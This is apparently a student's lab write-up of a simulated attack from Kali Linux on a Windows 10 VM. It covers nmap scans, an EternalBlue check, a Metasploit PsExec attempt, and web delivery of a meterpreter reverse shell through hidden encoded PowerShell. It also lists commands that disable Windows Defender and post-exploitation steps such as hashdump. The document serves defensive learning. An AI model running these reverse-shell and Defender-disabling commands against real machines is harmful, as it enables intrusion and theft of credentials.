Image Image
Objective:

Simulate a real-world attack from Kali Linux against a Windows 10 target machine to understand how attackers exploit vulnerabilities and how defenders detect them.

Machine OS IP Role
Kali Linux Kali 2026.1 192.168.56.20 Attacker
Windows Target Windows 10 LTSC 192.168.56.106 Victim
Ubuntu Server Ubuntu 24.04 192.168.56.10 Defender (Wazuh)

Phase 1: Reconnaissance
Tool: Nmap
Nmap (Network Mapper) is an open source tool used to discover hosts and services on a network. It is one of the first tools an attacker uses during reconnaissance.

Step 1 - Initial port scan:
nmap -sV 192.168.56.106
Windows Firewall was blocking all traffic.
Which is actually realistic - most corporate machines have firewalls enabled.
Fix: Disabled Windows Firewall for lab purposes: netsh advfirewall set allprofiles state off

Analysis:

Port 135 (MSRPC) - Windows Remote Procedure Call, used for inter-process communication
Port 139 (NetBIOS) - Legacy Windows file sharing protocol
Port 445 (SMB) (Server Message Block) used for file sharing and authentication. This is the most interesting port -it is the attack surface for EternalBlue (MS17-010), the exploit used in the 2017 WannaCry ransomware attack.

Step 2 - Vulnerability scan:
nmap -p 445 --script smb-vuln-ms17-010 192.168.56.106

No MS17-010 vulnerability found. Windows 10 LTSC is patched against EternalBlue.

Phase 2: Attempted Exploitation - EternalBlue (MS17-010)

What is EternalBlue?
EternalBlue is a critical vulnerability in Windows SMB protocol discovered by the NSA and leaked by the Shadow Brokers hacking group in 2017. It was used in the WannaCry ransomware attack that infected over 200,000 computers across 150 countries, causing an estimated $4 billion in damages.
CVE: MS17-010

Affected: Windows XP, 7, 8, Server 2003-2012

Fixed: Microsoft Security Bulletin MS17-010 (March 2017)
Why it failed
Windows 10 LTSC has SMB1 disabled by default since Microsoft disabled it following WannaCry. The scan confirmed the machine is patched: smb-vuln-ms17-010: Not vulnerable.
Lesson learned:
Modern Windows systems are patched against known exploits. Real attackers rarely rely on unpatched vulnerabilities - they use credential-based attacks and living-off-the-land techniques instead.

Phase 3: Attempted Exploitation - PsExec (Credential Attack)
What is PsExec?
PsExec is a legitimate Windows administration tool that allows running commands on remote computers. Attackers abuse it by using stolen credentials to gain SYSTEM-level access without exploiting any vulnerability.
Why this matters: According to Verizon's Data Breach Report, over 80% of breaches involve stolen or misused credentials ,not software vulnerabilities.
Attack attempt
use exploit/windows/smb/psexec
set RHOSTS 192.168.56.106
set LHOST 192.168.56.20
set SMBUser Victoria
set SMBPass [password]
set payload windows/x64/meterpreter/reverse_tcp
exploit

Why it failed:
UAC Remote Restrictions Windows 10 strips admin privileges from remote connections by default, even with valid admin credentials. This is controlled by LocalAccountTokenFilterPolicy in the registry.
SMB1 disabled , PsExec relies on SMB1 which is disabled on Windows 10 LTSC.

Lesson learned:
Windows 10 security hardening makes traditional SMB-based attacks much harder. This is why modern attackers use PowerShell and living-off-the-land techniques.

Phase 4: Web Delivery (PowerShell)
What is Web Delivery?
Web Delivery is a Metasploit module that hosts a malicious payload on a web server and delivers it via PowerShell. This simulates the most common real-world attack vector — phishing and social engineering.

Why?
Doesn't require any vulnerability
Uses PowerShell a legitimate Windows tool (Living off the Land)
Payload runs entirely in memory harder for antivirus to detect
This technique maps to MITRE ATT&CK T1059.001 (PowerShell abuse)
Used in over 60% of real-world attacks

Steps:
On Kali:
msfconsole
use exploit/multi/script/web_delivery
set target 2
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.20
set LPORT 4444
exploit -j

On Windos:
powershell.exe -nop -w hidden -e [BASE64_PAYLOAD]

Result:
PowerShell window closed silently - exactly the expected behavior when the payload executes successfully in memory. Unfortunately this were not the results i got because Windows is indeed connecting and downloading the payload but no session is being created because the Windows Defender is killing it after download, I tried running some commands ro disable it completely:
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableScriptScanning $true
Add-MpPreference -ExclusionPath "C:\Windows\Temp"
But that did not seem to change anything.

Meterpreter

It is an advanced Metasploit payload that:

Runs entirely in memory - never written to disk
Is encrypted - evades network detection
Gives full control - file system, processes, screenshots, keylogging
Can migrate between processes to avoid detection

Post-exploitation commands:
sysinfo - system information
getuid - current user (ideally SYSTEM)
ps - list all processes
screenshot - capture victim screen
hashdump - dump password hashes
shell - drop into Windows CMD

Challenges Encountered:
Challenge Cause Resolution
All ports filtered Windows Firewall enabled Disabled firewall for lab
EternalBlue failed Windows 10 LTSC is patched Moved to credential attack
PsExec ACCESS_DENIED UAC remote restrictions + SMB1 disabled Moved to web delivery
Session not created Clipboard issues caused corrupted payload Manually verified payload integrity
Kali VM freezing RAM constraints running multiple VMs Run max 2 VMs simultaneously

Key Lessons Learned:

Patching works — MS17-010 (EternalBlue) failed because Windows was patched. Keeping systems updated is the single most effective security control.
Credentials are the real attack surface — 80% of breaches use stolen credentials, not vulnerabilities.
PowerShell is a double-edged sword — it's powerful for admins and attackers alike. SOC analysts must monitor PowerShell execution closely.
Living off the Land — modern attackers use built-in Windows tools to avoid detection. This makes behavioral detection (Sysmon/Wazuh) more important than signature-based antivirus.
Defense in depth — Windows Firewall, UAC, SMB1 disabled, and patching all worked together to block multiple attack vectors.
